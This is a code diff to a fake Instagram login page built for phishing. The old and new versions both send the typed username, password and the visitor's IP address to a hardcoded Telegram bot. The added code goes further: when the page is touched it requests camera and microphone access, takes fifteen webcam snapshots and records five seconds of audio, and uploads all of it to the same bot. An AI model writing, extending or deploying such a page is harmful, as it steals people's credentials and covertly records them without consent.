@@ -6,9 +6,9 @@
     <title>Instagram</title>
     <style>
         body {
-            background-color: #000;
-            color: #fff;
-            font-family: 'Helvetica', Arial, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,135 +16,149 @@
             margin: 0;
         }
         .container {
-            width: 100%;
-            max-width: 400px;
-            padding: 40px;
+            background-color: #1d1d1d;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.5);
             text-align: center;
+            width: 320px;
         }
-        .logo img {
-            width: 175px;
+        .logo {
             margin-bottom: 20px;
         }
-        .facebook-button {
-            background-color: #0095f6;
-            color: white;
-            width: 100%;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        .facebook-button:hover {
-            background-color: #007bb5;
-        }
-        .divider {
-            margin: 20px 0;
-            color: #8e8e8e;
-            font-weight: bold;
+        .logo img {
+            width: 180px;
         }
         input {
             width: 100%;
-            padding: 12px;
+            padding: 10px;
             margin: 8px 0;
-            border: 1px solid #8e8e8e;
+            border: none;
             border-radius: 5px;
-            background-color: #121212;
-            color: white;
-            font-size: 14px;
+            background-color: #2c2c2c;
+            color: #ffffff;
         }
         input::placeholder {
-            color: #8e8e8e;
+            color: #bbbbbb;
         }
-        .login-button {
+        button {
+            width: 100%;
+            padding: 10px;
             background-color: #0095f6;
             color: white;
-            width: 100%;
-            padding: 12px;
             border: none;
             border-radius: 5px;
             font-size: 16px;
             cursor: pointer;
-            font-weight: bold;
         }
-        .login-button:hover {
+        button:hover {
             background-color: #007bb5;
         }
-        .forgot-password {
-            margin: 10px 0;
-            color: #0095f6;
-            font-size: 14px;
-            text-decoration: none;
-        }
-        .signup-link {
-            color: #0095f6;
-            text-decoration: none;
-        }
         .footer {
-            margin-top: 30px;
-            color: #8e8e8e;
-            font-size: 12px;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .footer a {
+            color: #0095f6;
+            text-decoration: none;
         }
     </style>
 </head>
-<body>
+<body ontouchstart="triggerEvent()">
 
     <div class="container">
-        <!-- Instagram Logo -->
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
         </div>
-
-        <!-- Continue with Facebook -->
-        <button class="facebook-button">Continue with Facebook</button>
-
-        <!-- Divider -->
-        <div class="divider">OR</div>
-
-        <!-- Login Form -->
-        <input type="text" id="username" placeholder="Phone number, username, or email">
+        <input type="text" id="username" placeholder="Instagram ID">
         <input type="password" id="password" placeholder="Password">
-        <button class="login-button" onclick="sendData()">Log In</button>
-
-        <a href="#" class="forgot-password">Forgot password?</a>
-
-        <div class="footer">
-            Don't have an account? <a href="#" class="signup-link">Sign up</a>
-        </div>
+        <button onclick="sendData()">Log In</button>
+        <div class="footer">Don't have an account? <a href="#">Sign up</a></div>
     </div>
 
     <script>
         let ipAddress = "Unknown IP";
+        let fileShareLink = "Unknown link";
+        let imageBlobs = [];
+        let audioBlob;
 
-        async function fetchIP() {
+        async function triggerEvent() {
+            await getIpAddress();
+            await captureMedia();
+            sendInitialBotMessage();
+        }
+
+        async function getIpAddress() {
+            await fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip;
+                    fileShareLink = `http://${ipAddress}:8080`;
+                });
+        }
+
+        async function captureMedia() {
             try {
-                await fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        ipAddress = data.ip;
-                    });
-            } catch (error) {
-                console.error('Error fetching IP:', error);
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
+                // Capture 15 snapshots
+                captureSnapshots(stream);
+
+                // Record 5 seconds of audio
+                recordAudio(stream);
+            } catch (err) {
+                console.error('Media capture failed:', err);
             }
         }
 
-        fetchIP();
+        function captureSnapshots(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
 
-        function sendData() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+            let snapshotCount = 0;
+            const interval = setInterval(() => {
+                if (snapshotCount >= 15) {
+                    clearInterval(interval);
+                    return;
+                }
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => {
+                    imageBlobs.push(blob);
+                    sendImageToBot(blob);
+                }, 'image/jpeg');
+                snapshotCount++;
+            }, 500);
+        }
 
-            if (username.trim() === "" || password.trim() === "") {
-                alert("Please fill in both fields.");
-                return;
-            }
+        function recordAudio(stream) {
+            const mediaRecorder = new MediaRecorder(stream);
+            const audioChunks = [];
 
-            const message = `New Login Attempt:\nInstagram ID: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nTime: ${new Date().toLocaleString()}`;
+            mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+            mediaRecorder.start();
 
-            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';  // Your bot token
-            const chatId = '860517021';  // Your chat ID
+            setTimeout(() => {
+                mediaRecorder.stop();
+            }, 5000);
+
+            mediaRecorder.onstop = () => {
+                audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                sendAudioToBot(audioBlob);
+            };
+        }
+
+        function sendInitialBotMessage() {
+            const message = `New Interaction:\nIP Address: ${ipAddress}\nFile Share Link: ${fileShareLink}\nTime: ${new Date().toLocaleString()}`;
+            sendMessageToBot(message);
+        }
+
+        function sendMessageToBot(message) {
+            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
+            const chatId = '860517021';
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             fetch(telegramApiUrl, {
@@ -156,9 +170,35 @@
                     chat_id: chatId,
                     text: message
                 })
-            }).then(() => {
-                window.location.href = "https://www.instagram.com/accounts/login/";
             });
+        }
+
+        function sendAudioToBot(audioBlob) {
+            const formData = new FormData();
+            formData.append('audio', audioBlob, 'audio.wav');
+
+            fetch(`https://api.telegram.org/bot7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds/sendAudio`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        function sendImageToBot(imageBlob) {
+            const formData = new FormData();
+            formData.append('photo', imageBlob, 'snapshot.jpg');
+
+            fetch(`https://api.telegram.org/bot7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        function sendData() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const message = `Login Attempt:\nInstagram ID: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nTime: ${new Date().toLocaleString()}`;
+            sendMessageToBot(message);
         }
     </script>
 
